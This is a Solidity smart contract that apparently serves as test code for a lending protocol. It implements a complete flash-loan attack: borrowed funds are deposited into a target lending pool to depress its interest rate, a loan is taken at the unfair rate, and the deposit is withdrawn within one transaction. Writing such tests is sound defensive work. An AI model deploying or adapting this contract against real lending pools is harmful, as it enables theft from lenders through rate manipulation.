pragma solidity ^0.5.17;
pragma experimental ABIEncoderV2;
// "SPDX-License-Identifier: Apache-2.0"

import "../interfaces/IERC20.sol";
import "../openzeppelin/Ownable.sol";
import "./ITokenFlashLoanTest.sol";

/**
 * @title The interface of the lending pool iToken to attack.
 * @notice Only burn, mint and borrow functions are required.
 * */
interface IToken {
	function burn(address receiver, uint256 burnAmount) external returns (uint256 loanAmountPaid);

	function mint(address receiver, uint256 depositAmount) external returns (uint256 mintAmount);

	function borrow(
		bytes32 loanId, /// 0 if new loan.
		uint256 withdrawAmount,
		uint256 initialLoanDuration, /// Duration in seconds.
		uint256 collateralTokenSent, /// If 0, loanId must be provided; any rBTC sent must equal this value.
		address collateralTokenAddress, /// If address(0), this means rBTC and rBTC must be sent with the call or loanId must be provided.
		address borrower,
		address receiver,
		bytes calldata /// loanDataBytes: arbitrary order data (for future use).
	)
		external
		payable
		returns (
			uint256,
			uint256 /// Returns new principal and new collateral added to loan.
		);
}

/**
 * @title Flash Loan Attack.
 * @notice This contract performs a flash loan (FL) call to achieve a double goal:
 *   1.- Get a big amount of underlying tokens (hackDepositAmount)
 *         during just one transaction. (FL)
 *   2.- Use that big amount to manipulate the loan rate of another loan pool, and
 *         then get a borrow principal w/ an extremely low interest.
 * */
contract FlashLoanAttack is Ownable {

    /* Storage */
    address iTokenToHack; /// The address of the lending pool iToken to hack.
    address collateralToken; /// The address of the collateral token.
    uint256 withdrawAmount; /// The borrowing principal.
    uint256 collateralTokenSent; /// The borrowing collateral.

    /* Events */
	event ExecuteOperation(address loanToken, address iToken, uint256 loanAmount);

	event BalanceOf(uint256 balance);

    /* Functions */

    /**
     * @notice Set the parameters of the loan pool attack.
     * @param _iTokenToHack The address of the lending pool iToken to hack.
     * @param _collateralToken The address of the collateral token.
     * @param _withdrawAmount The borrowing principal.
     * @param _collateralTokenSent The borrowing collateral.
     * */
	function hackSettings(
        address _iTokenToHack,
        address _collateralToken,
        uint256 _withdrawAmount,
        uint256 _collateralTokenSent
	) external onlyOwner {
        iTokenToHack = _iTokenToHack;
        collateralToken = _collateralToken;
        withdrawAmount = _withdrawAmount;
        collateralTokenSent = _collateralTokenSent;
    }

    /**
     * @notice Internal launch of the FL attack.
     * @param underlyingToken The address of the underlying token.
     * @param iToken The address of the third party FL token pool.
     * @param hackDepositAmount The big amount of underlying tokens provided by the FL.
     * @return Success or failure in binary format.
     * */
	function initiateFlashLoanAttack(
		address underlyingToken,
		address iToken,
		uint256 hackDepositAmount
	) internal returns (bytes memory success) {
		ITokenFlashLoanTest iTokenContract = ITokenFlashLoanTest(iToken);
		return
			iTokenContract.flashBorrow(
				hackDepositAmount,
				address(this),
				address(this),
				"",
				abi.encodeWithSignature(
                    "executeOperation(address,address,uint256)",
                    underlyingToken,
                    iToken,
                    hackDepositAmount
                )
			);
	}

    /**
     * @notice Send back the underlying tokens used in the hack to the FL provider.
     * @param underlyingToken The address of the underlying token.
     * @param iToken The address of the third party FL token pool.
     * @param hackDepositAmount The big amount of underlying tokens provided by the FL.
     * */
	function repayFlashLoan(
		address underlyingToken,
		address iToken,
		uint256 hackDepositAmount
	) internal {
		IERC20(underlyingToken).transfer(iToken, hackDepositAmount);
	}

	/**
     * @notice This is the callback function passed to the FL contract.
     * @dev FL contract will call this function after providing the sender,
     *   (i.e. this contract) with the funds to perform the attack.
     * @param underlyingToken The address of the underlying token.
     * @param iToken The address of the third party FL token pool.
     * @param hackDepositAmount The big amount of underlying tokens provided by the FL.
     * @return Success or failure in binary format.
     * */
    function executeOperation(
		address underlyingToken,
		address iToken,
		uint256 hackDepositAmount
	) external returns (bytes memory success) {
        /// @dev Event log to register the big amount of tokens have been received.
		emit BalanceOf(IERC20(underlyingToken).balanceOf(address(this)));

        /// @dev Event log to register the callback function has been called.
		emit ExecuteOperation(underlyingToken, iToken, hackDepositAmount);

        /// @dev The following code executes the hack using the funds provided by FL.
        hackTheLoanPool(underlyingToken, hackDepositAmount);

        /// @dev Payback the FL.
		repayFlashLoan(underlyingToken, iToken, hackDepositAmount);

        /// @dev Success.
		return bytes("1");
	}

	/**
     * @notice External wrapper to initiateFlashLoanAttack.
     * @dev Register the underlying token balance before and after the FL.
     * @param underlyingToken The address of the underlying token.
     * @param iToken The address of the third party FL token pool.
     * @param hackDepositAmount The big amount of underlying tokens provided by the FL.
     * */
	function doStuffWithFlashLoan(
		address underlyingToken,
		address iToken,
		uint256 hackDepositAmount
	) external onlyOwner {
		bytes memory result;

        /// @dev Event log to register the amount of underlying tokens before FL.
		emit BalanceOf(IERC20(underlyingToken).balanceOf(address(this)));

		result = initiateFlashLoanAttack(underlyingToken, iToken, hackDepositAmount);

        /// @dev Event log to register the amount of underlying tokens after FL.
		emit BalanceOf(IERC20(underlyingToken).balanceOf(address(this)));

		/// @dev After loan checks and what not.
		if (hashCompareWithLengthCheck(bytes("1"), result)) {
			revert("FlashLoanAttack::failed executeOperation");
		}
	}

	/**
     * @notice Check two payloads are equal.
     * @dev It compares their length and their hashes.
     * @param a First payload to compare.
     * @param b Second payload to compare.
     * */
	function hashCompareWithLengthCheck(bytes memory a, bytes memory b) internal pure returns (bool) {
		if (a.length != b.length) {
			return false;
		} else {
			return keccak256(a) == keccak256(b);
		}
	}

	/**
     * @notice Deposit underlying tokens on loan pool to manipulate its
     * interest rate and borrow a principal w/ the unfair rate and get
     * back the underlying tokens, all of it in just one transaction.
     * @param underlyingToken The address of the underlying token.
     * @param hackDepositAmount The big amount of underlying tokens provided by the FL.
     * */
    function hackTheLoanPool(
        address underlyingToken,
		uint256 hackDepositAmount
	) internal {
		IToken iTokenToHackContract = IToken(iTokenToHack);

		/// @dev Allow the lending pool iTokenToHack to get a deposit
        ///   from this contract as a lender.
		IERC20(underlyingToken).approve(iTokenToHack, hackDepositAmount);

		/// @dev Check this contract has the underlying tokens to deposit.
		require(
			IERC20(underlyingToken).balanceOf(address(this)) >= hackDepositAmount,
			"FlashLoanAttack contract has not the required balance: hackDepositAmount."
		);

		/// @dev Check this contract has the allowance to move the tokens
        ///   to the lending pool.
		require(
			IERC20(underlyingToken).allowance(address(this), iTokenToHack) >= hackDepositAmount,
			"FlashLoanAttack contract is not allowed to move hackDepositAmount."
		);

		/// @dev Make a deposit as a lender, in order to manipulate the
        ///   interest rate of the lending pool.
		iTokenToHackContract.mint(address(this), hackDepositAmount);

		/// @dev Check this contract has the collateral tokens to deposit.
		require(
			IERC20(collateralToken).balanceOf(address(this)) >= collateralTokenSent,
			"FlashLoanAttack contract has not the required balance: collateralTokenSent."
		);

		/// @dev Borrow liquidity from the pool w/ an unfair rate.
		iTokenToHackContract.borrow(
			"0x0", /// loanId, 0 if new loan.
			withdrawAmount,
			86400, /// initialLoanDuration
			collateralTokenSent,
			collateralToken, /// collateralTokenAddress
			address(this), /// borrower
			address(this), /// receiver
			"0x0"
		);

		/// @dev Get back the amount deposited in the first place.
		iTokenToHackContract.burn(address(this), hackDepositAmount);
    }
}
